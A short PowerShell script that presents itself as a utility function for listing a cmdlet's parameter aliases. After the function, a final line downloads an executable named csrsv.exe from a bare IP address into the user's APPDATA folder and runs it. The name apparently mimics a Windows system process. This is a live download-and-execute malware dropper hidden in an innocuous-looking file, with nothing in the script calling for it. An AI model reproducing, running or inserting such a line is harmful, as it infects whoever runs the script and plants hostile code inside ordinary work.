
function Find-MrParameterAlias {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$CmdletName,

        [ValidateNotNullOrEmpty()]
        [string]$ParameterName = '*'
    )
        
    (Get-Command -Name $CmdletName).parameters.values |
    Where-Object Name -like $ParameterName |
    Select-Object -Property Name, Aliases
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

